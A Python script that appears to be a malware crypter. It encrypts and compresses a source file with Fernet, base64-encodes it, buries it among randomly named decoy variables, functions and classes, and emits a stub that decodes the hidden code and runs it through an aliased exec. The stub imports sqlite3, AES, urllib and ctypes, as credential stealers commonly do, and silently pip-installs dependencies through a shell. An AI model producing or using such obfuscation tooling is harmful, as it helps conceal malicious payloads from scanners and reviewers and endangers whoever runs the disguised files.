import argparse
import zlib
import base64
import subprocess
try:
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.run('python -m pip install cryptography', shell=True)
    from cryptography.fernet import Fernet
import random
import os
import string

parser = argparse.ArgumentParser(description='Obfuscate and create an executable.')

parser.add_argument('name', help='Name for the obfuscated file (Do not include the extension)')

args = parser.parse_args()

key = Fernet.generate_key()

ss = f"{args.name}.py"
with open("encryption_key.txt", "wb") as key_file:
    key_file.write(key)

with open("encryption_key.txt", "rb") as key_file:
    key = key_file.read()

cipher_suite = Fernet(key)

with open("./Build/temp.py", "rb") as code_file:
    code = code_file.read()

encrypted_code = cipher_suite.encrypt(zlib.compress(code))
encoded_code = base64.b64encode(encrypted_code).decode('utf-8')

fake_vars = {}
for i in range(10):  
    fake_name = ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))
    fake_value = random.randint(1000000, 100000000)
    fake_vars[fake_name] = fake_value

fake_code = [f'{fake_name} = {fake_value}' for fake_name, fake_value in fake_vars.items()]

def random_function_name():
    return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(25))

fake_functions = {}
for _ in range(15):  # Increase the number of fake functions
    func_name = random_function_name()
    func_code = "\n".join([f'{fake_name} = {fake_value}' for fake_name, fake_value in fake_vars.items()])
    fake_functions[func_name] = func_code

def random_class_name():
    return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))

fake_classes = {}
for _ in range(10): 
    class_name = random_class_name()
    class_code = "\n".join([f'{fake_name} = {fake_value}' for fake_name, fake_value in fake_vars.items()])
    fake_classes[class_name] = class_code

fake_code_str = "\n".join(fake_code)

fake_functions_str = "\n".join([f'def {func_name}():\n    {func_code}' for func_name, func_code in fake_functions.items()])

fake_classes_str = "\n".join([f'class {class_name}:\n    {class_code}' for class_name, class_code in fake_classes.items()])

fake_code_list = [fake_code_str, fake_functions_str, fake_classes_str]
random.shuffle(fake_code_list)
all_fake_code = "\n".join(fake_code_list)
e = random_class_name()
obfuscated_code = f'''
{all_fake_code}
import zlib
import base64
{all_fake_code}
import cryptography
from cryptography.fernet import Fernet
encoded_code = "{encoded_code}"
{e} = exec
encrypted_code = base64.b64decode(encoded_code)
{all_fake_code}
decrypted_code = Fernet(b'{key.decode("utf-8")}').decrypt(encrypted_code)
{all_fake_code}
decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
{e}(decompressed_code)
{all_fake_code}
'''

s = base64.b64encode(obfuscated_code.encode('utf-8'))

with open(f'.\\build\{ss}', "wb") as obfu_file:
    obfu_file.write(f"{all_fake_code};import ctypes;import base64,subprocess,sqlite3,json,shutil\nfrom json import loads, dumps\nfrom urllib.request import Request, urlopen\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\nb={s}.decode('utf-8')\n{e}(base64.b64decode(b))\n{all_fake_code}".encode("utf-8"))   
os.remove("encryption_key.txt")
print(f"The code has been encrypted, Filename: .\\build\{ss}")
